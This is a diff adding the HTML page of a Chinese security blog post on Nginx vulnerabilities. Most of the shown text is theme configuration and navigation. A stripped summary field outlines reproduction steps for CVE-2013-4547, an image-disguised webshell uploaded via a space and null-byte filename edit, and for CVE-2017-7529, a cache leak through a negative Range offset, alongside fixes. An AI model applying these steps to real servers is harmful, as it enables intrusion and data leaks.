@@ -1,0 +1,798 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Nginx常见安全漏洞 | 高木のBlog</title><meta name="keywords" content="漏洞复现,中间件,渗透测试"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Nginx常见安全漏洞"><meta name="application-name" content="Nginx常见安全漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Nginx常见安全漏洞"><meta property="og:url" content="https://blog.takake.com/posts/18454/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="以下是Nginx常见的历史漏洞及配置错误导致的安全问题，按类型和影响分类整理：  一、解析类漏洞 文件名逻辑漏洞（CVE-2013-4547）   影响版本：Nginx 0.8.411.4.3 &amp;#x2F; 1.5.01.5.7   原理：错误解析URI中的空格（0x20）和空字节（0x00），导致"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png"><meta name="description" content="以下是Nginx常见的历史漏洞及配置错误导致的安全问题，按类型和影响分类整理：  一、解析类漏洞 文件名逻辑漏洞（CVE-2013-4547）   影响版本：Nginx 0.8.411.4.3 &amp;#x2F; 1.5.01.5.7   原理：错误解析URI中的空格（0x20）和空字节（0x00），导致"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/18454/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: {"mode":null,"api":null,"cover_change":true},
+  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
+  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  shortcutKey: undefined,
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '高木のBlog',
+  title: 'Nginx常见安全漏洞',
+  postAI: 'Nginx常见漏洞及配置问题包括解析类（如CVE-2013-4547）、缓存与信息泄露（如CVE-2017-7529）、配置错误（如CRLF注入、目录穿越）及其他安全配置问题。建议定期升级版本、严格校验配置、启用安全响应头，并限制文件上传与解析逻辑。',
+  pageFillDescription: '一、解析类漏洞, 二、缓存与信息泄露漏洞, 三、配置错误导致的漏洞, 四、其他安全配置问题, 五.文件名逻辑漏洞（CVE-2013-4547）, 1. 漏洞原理, 2. 环境搭建, 3. 漏洞复现步骤, 步骤1：上传恶意文件, 步骤2：Burp拦截与修改请求, 步骤3：触发解析漏洞, 4. 高级利用（如命令执行）, 5. 注意事项, 6. 漏洞修复建议, 7. 总结, 六. 越界读取缓存漏洞（CVE-2017-7529）, 1. 漏洞原理, 2. 环境搭建, 3. 漏洞复现步骤, 步骤1：获取POC脚本, 步骤2：执行POC脚本, 步骤3：验证漏洞利用, 4. 高级利用与调试, 5. 注意事项, 6. 漏洞修复建议, 7. 总结, 总结以下是常见的历史漏洞及配置错误导致的安全问题按类型和影响分类整理一解析类漏洞文件名逻辑漏洞影响版本原理错误解析中的空格和空字节导致攻击者可通过构造文件名如空格空字节绕过安全检查使非文件被解析为执行利用场景上传恶意文件后通过修改请求头触发解析漏洞配置不当导致的解析漏洞影响范围与和版本无关因默认开启值为原理将结尾的请求直接转发给处理即使文件路径中部分不存在例如访问时会被当作解析截断解析漏洞影响版本原理利用中的空字节截断路径解析例如访问使非文件被解析总结上传解析二缓存与信息泄露漏洞越界读取缓存漏洞影响版本原理当作为反向代理并开启缓存时攻击者可通过构造恶意请求头读取缓存文件的头部信息泄露敏感数据如后端服务器信息修复建议升级至安全版本禁用不必要的缓存功能三配置错误导致的漏洞注入漏洞响应头注入原理错误使用变量解码后的导致换行符注入响应头可插入恶意或代码例如配置时攻击者通过篡改响应头修复方案改用未解码的原始目录穿越漏洞原理错误配置指令导致路径穿越例如允许通过访问上级目录造成任意文件下载修复方案确保路径与匹配如末尾添加头覆盖漏洞原理子配置块如中的指令覆盖父块配置导致安全头如失效例如父块设置防御但子块未继承该配置修复方案在子块中显式继承父块的安全头配置四其他安全配置问题头攻击风险未校验头可能导致恶意域名指向缓存污染或修复方案配置白名单并拦截非法请求安全响应头缺失常见问题未配置防御点击劫持禁用嗅探防御等修复示例五文件名逻辑漏洞以下是针对文件名逻辑漏洞的复现流程结合漏洞原理与利用步骤整理漏洞原理影响版本和漏洞成因解析时错误处理空格和空字节导致非文件如图片被当作解析例如请求时匹配正则但实际处理文件名被截断并发送给解析绕过安全限制环境搭建启动漏洞环境访问确认环境启动成功漏洞复现步骤步骤上传恶意文件创建图片马生成一个包含代码的图片文件如直接修改文本文件名后缀即可内容示例使用头伪装为合法图片绕过上传检测上传文件通过网页上传接口上传文件名需包含空格如步骤拦截与修改请求拦截上传请求使用抓取上传数据包修改文件名在的视图中将文件名末尾的两个空格改为一个空格和一个空字节示例发送修改后的请求上传成功后文件路径为步骤触发解析漏洞构造恶意请求访问以下触发解析漏洞需通过抓取该请求并确保路径中包含空格与空字节的十六进制编码验证执行若成功页面将显示信息证明非文件被解析为代码高级利用如命令执行上传将图片马中的代码替换为如执行命令访问可执行系统命令注意事项文件名长度尽量缩短文件名避免修改时出错环境差异需确保上传文件名包含空格如系统自动忽略文件名末尾空格上传普通文件名即可利用配置需满足为空默认仅允许否则漏洞无法触发漏洞修复建议升级至安全版本或过滤特殊字符禁止文件名包含空格或空字节重命名上传文件避免保留用户输入的文件名总结该漏洞利用对解析的缺陷通过构造含空格与空字节的文件名绕过安全检测复现时需注意环境配置与请求修改的细节更多技术细节可参考官方文档及上述复现案例六越界读取缓存漏洞以下是针对越界读取缓存漏洞的复现流程及技术分析结合漏洞原理与利用步骤整理漏洞原理影响版本漏洞成因当作为反向代理并开启缓存时缓存文件包含文件头含后端服务器信息返回包头返回包体攻击者通过构造包含恶意头的请求利用整数溢出漏洞使读取缓存文件的头部信息如后端配置敏感信息关键点头中的负值偏移导致越界读取缓存文件的头部内容环境搭建启动漏洞环境访问确认环境正常运行显示默认页面漏洞复现步骤步骤获取脚本环境自带脚本或从搜索结果中复制以下代码步骤执行脚本脚本逻辑获取目标的原始响应长度计算偏移量默认构造恶意头其中触发整数溢出使读取缓存文件头部步骤验证漏洞利用成功表现返回内容中包含缓存文件头信息如状态后端服务器或端口示例输出高级利用与调试调整偏移量若默认未成功可手动调整偏移值如确保范围覆盖缓存文件头部多段构造构造多个负值如尝试读取不同位置的敏感数据注意事项缓存配置要求需启用反向代理缓存默认环境已配置若未命中缓存需多次访问目标以生成缓存文件响应状态码成功利用时返回状态码失败则返回或漏洞修复建议升级至安全版本或关闭代理缓存非必要场景限制请求范围通过配置限制头的合法性总结的复现核心在于构造恶意头触发缓存文件越界读取利用环境可快速验证漏洞实际渗透中需结合目标配置调整偏移量修复时建议优先升级版本或关闭高风险功能更多细节可参考官方文档及上述技术分析总结的安全问题主要分为三类代码解析漏洞如配置不当漏洞如注入目录穿越安全头缺失或覆盖如建议措施定期升级版本严格校验配置如使用替代启用必要安全响应头并限制文件上传与解析逻辑更多细节可参考各漏洞的复现环境如及官方文档',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-28 01:24:36',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 8 || hour >= 22
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "10",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>4</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>2</sup></a><a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">JAVA反序列化<sup>4</sup></a><a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">JAVA反序列化漏洞<sup>4</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 1.05rem;">JAVA高级<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>16</sup></a><a href="/tags/TLS/" style="font-size: 1.05rem;">TLS<sup>1</sup></a><a href="/tags/base64/" style="font-size: 1.05rem;">base64<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 1.05rem;">draft<sup>4</sup></a><a href="/tags/esxi/" style="font-size: 1.05rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/utf-8/" style="font-size: 1.05rem;">utf-8<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>13</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>10</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">开发<sup>4</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>18</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>19</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.05rem;">编码<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 1.05rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>7</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>漏洞复现</span></a><a class="article-meta__tags" 